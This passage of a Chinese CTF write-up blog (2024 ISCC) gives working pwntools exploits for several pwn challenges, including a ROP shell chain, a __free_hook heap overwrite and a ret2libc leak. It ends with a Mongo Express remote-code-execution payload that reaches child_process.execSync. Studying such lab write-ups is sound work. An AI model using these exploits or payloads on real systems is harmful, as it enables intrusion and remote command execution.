class="hljs-number">0xb</span>) + p32(constants[<span class="hljs-string">&#x27;ebx_edx&#x27;</span>])<br>    payload += p32(constants[<span class="hljs-string">&#x27;bin_sh&#x27;</span>]) + p32(<span class="hljs-number">0</span>) + p32(constants[<span class="hljs-string">&#x27;ecx&#x27;</span>]) + p32(<span class="hljs-number">0</span>) + p32(constants[<span class="hljs-string">&#x27;int_80&#x27;</span>])<br>    <span class="hljs-keyword">return</span> payload<br><br>io.sendline(build_payload(constants, canary))<br>io.interactive()<br></code></pre></td></tr></table></figure>

<h4 id="pwn-shopping"><a href="#pwn-shopping" class="headerlink" title="pwn shopping"></a>pwn shopping</h4><p><img src="../../../../img/archives/2024ISCC05/3e401ef9060d3882e4fe66f4ca370b6a.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/6f3e40a0b7393c3ed815924806ffdcc2.png" srcset="/img/loading.gif" lazyload> IDA 反编译进行分析，main 起了 start_routine 的线程</p>
<p>线程中是循环，循环中的输入函数存在溢出，从而覆盖程序的关键数据结构。利用堆溢出，覆盖目标程序的 free_hook 指针，使其指向 system 函数的地址。接着，通过释放一个包含 “&#x2F;bin&#x2F;sh” 字符串的 fake_chunk，触发 system(“&#x2F;bin&#x2F;sh”)的执行，从而获取的 shell。</p>
<p>攻击步骤:</p>
<p><img src="../../../../img/archives/2024ISCC05/5004c816f624e46cbde84e588f57af71.png" srcset="/img/loading.gif" lazyload> 首先添加大量数据，占用大量的内存空间。利用程序的逻辑漏洞，精心构造一个包含特定长度附带信息的数据，使其精准地覆盖目标数据结构。并通过覆盖__free_hook 指针，将其指向 system 函数的地址，劫持了程序的控制流。最后释放一个包含 “&#x2F;bin&#x2F;sh” 字符串的 chunk，触发 system(“&#x2F;bin&#x2F;sh”)的执行。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;182.92.237.102&#x27;</span>, <span class="hljs-number">10019</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./attachment-11&#x27;</span>)<br>system_plt = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>io.sendlineafter(<span class="hljs-string">&#x27;Enter the password:&#x27;</span>, <span class="hljs-string">&quot;I&#x27;m ready for shopping\n&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_item</span>(<span class="hljs-params">size, num, content=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>   io.sendlineafter(<span class="hljs-string">&#x27;Action:&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>   io.sendlineafter(<span class="hljs-string">&#x27;Item ID:&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>   io.sendlineafter(<span class="hljs-string">&#x27;Quantity:&#x27;</span>, <span class="hljs-built_in">str</span>(num))<br>   <span class="hljs-keyword">if</span> content == <span class="hljs-string">&#x27;&#x27;</span>:<br>      io.sendlineafter(<span class="hljs-string">&#x27;Add gift message? (0/1):&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>   <span class="hljs-keyword">else</span>:<br>      io.sendlineafter(<span class="hljs-string">&#x27;Add gift message? (0/1):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>      io.sendafter(<span class="hljs-string">&#x27;Message:&#x27;</span>, content)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>):<br>   add_item(<span class="hljs-number">0x4000</span>, <span class="hljs-number">1000</span>)<br><br>add_item(<span class="hljs-number">0x4000</span>, <span class="hljs-number">262</span>, <span class="hljs-string">&#x27;0&#x27;</span>*<span class="hljs-number">0x3FF0</span>)<br>overflow_data = <span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x50</span> + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">3</span>) + <span class="hljs-string">b&#x27;&#x27;</span>.join([p64(<span class="hljs-number">0x60201d</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)])<br>sleep(<span class="hljs-number">0.2</span>)<br>io.send(overflow_data)<br>sleep(<span class="hljs-number">0.2</span>)<br>command_str = <span class="hljs-string">b&#x27;/bin/sh&#x27;</span>.ljust(<span class="hljs-number">0xB</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(system_plt)<br>final_payload = command_str.ljust(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;b&#x27;</span>)<br>add_item(<span class="hljs-number">0x60</span>, <span class="hljs-number">0</span>, final_payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<h4 id="pwn-Your-program"><a href="#pwn-Your-program" class="headerlink" title="pwn Your_program"></a>pwn Your_program</h4><p><img src="../../../../img/archives/2024ISCC05/1eda475542dbd971af966f54c530ac45.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/2eb6d72d926a423af2cb0370161e8f4a.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/8e3b3e82b1720e661e4d3f8f1cb04b65.png" srcset="/img/loading.gif" lazyload> IDA 反编译</p>
<p>根据代码分析，authorize 函数存在栈溢出漏洞：</p>
<p>gets 函数没有限制输入长度，可以输入任意长度的字符串。</p>
<p><img src="../../../../img/archives/2024ISCC05/026ea5466c0ced090cda36d9807422d2.png" srcset="/img/loading.gif" lazyload> 验证密钥时只检查了第 28 个字符，而输入的字符串可以覆盖栈上的其他数据，包括返回地址。因此，我们可以利用这个漏洞，构造特殊的输入，将返回地址覆盖为 system 函数的地址，从而在程序执行 ret 指令时跳转到 system 函数执行，最终获取 shell。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>r = remote(<span class="hljs-string">&#x27;182.92.237.102&#x27;</span>, <span class="hljs-number">10032</span>)<br>e = ELF(<span class="hljs-string">&#x27;./attachment-42&#x27;</span>)<br>l = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak</span>():<br>    <span class="hljs-keyword">return</span> u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">40</span> + p64(rdi+<span class="hljs-number">1</span>) + p64(rdi) + p64(addr)<br><br>rdi = <span class="hljs-number">0x401763</span><br>auth = <span class="hljs-number">0x401276</span><br>pop_rdi = p64(rdi) + p64(e.got[<span class="hljs-string">&#x27;printf&#x27;</span>]) + p64(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(auth)<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">40</span> + pop_rdi<br><br>r.sendlineafter(<span class="hljs-string">&#x27;Enter key:&#x27;</span>, payload)<br>base = leak() - l.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>system = base + l.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>sh = base + <span class="hljs-built_in">next</span>(l.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br>r.sendlineafter(<span class="hljs-string">&#x27;Enter key:&#x27;</span>, pack(sh) + p64(system))<br>r.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="实战题"><a href="#实战题" class="headerlink" title="实战题"></a>实战题</h3><h4 id="阶段一"><a href="#阶段一" class="headerlink" title="阶段一"></a>阶段一</h4><p><img src="../../../../img/archives/2024ISCC05/8fd591d2aa2f626e6de8955888b705e2.png" srcset="/img/loading.gif" lazyload> 连接后发现是 Mongo Express，直接搜索漏洞</p>
<p><img src="../../../../img/archives/2024ISCC05/a936dae8418492d9c50001abaf03bc4a.png" srcset="/img/loading.gif" lazyload></p>
<p>对照发现版本符合</p>
<p><img src="../../../../img/archives/2024ISCC05/356f4a01718972aa503b98d15976c5dd.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/964cc68b2c087595311360ddf5de7486.png" srcset="/img/loading.gif" lazyload></p>
<p>构造 exp 创建目录（burpsuite 有问题没代理上）</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><br><br>proxy = &#123;<span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&quot;socks5://127.0.0.1:1080&quot;</span>&#125;<br>headers = &#123;<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>    <span class="hljs-string">&#x27;Authorization&#x27;</span>: <span class="hljs-string">&#x27;Basic YWRtaW46cGFzcw==&#x27;</span><br>&#125;<br>res = requests.post(url=<span class="hljs-string">&#x27;http://172.17.0.1:8081/checkValid&#x27;</span>, headers=headers, <br>            data=<span class="hljs-string">&#x27;document=this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;touch /Success_tenstrings&quot;)&#x27;</span>, <br>                    proxies=proxy)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure>

<p><img src="../../../../img/archives/2024ISCC05/d1e1f65f1b849ca349ee4f0be33a134b.png" srcset="/img/loading.gif" lazyload></p>
<p>返回 Vaild，执行成功</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="../../../../tags/CTF/" class="print-no-link">#CTF</a>
      
        <a href="../../../../tags/Misc/" class="print-no-link">#Misc</a>
      
        <a href="../../../../tags/Web/" class="print-no-link">#Web</a>
      
        <a href="../../../../tags/Crypto/" class="print-no-link">#Crypto</a>
      
        <a href="../../../../tags/Reverse/" class="print-no-link">#Reverse</a>
      
        <a href="../../../../tags/Pwn/" class="print-no-link">#Pwn</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>2024 ISCC 个人挑战赛</div>
      <div>http://more678.github.io/2024/05/31/2024-ISCC/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>tenstrings</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年5月31日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="../../../10/16/2024%E9%A2%86%E8%88%AA%E6%9D%AF%E6%9C%AC%E7%A7%91%E7%BB%84%E5%88%9D%E8%B5%9B/" title="2024领航杯本科组初赛">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">2024领航杯本科组初赛</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  

</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="../../../../js/events.js" ></script>
<script  src="../../../../js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="../../../../js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="../../../../js/leancloud.js" ></script>

  <script  src="../../../../js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="../../../../js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
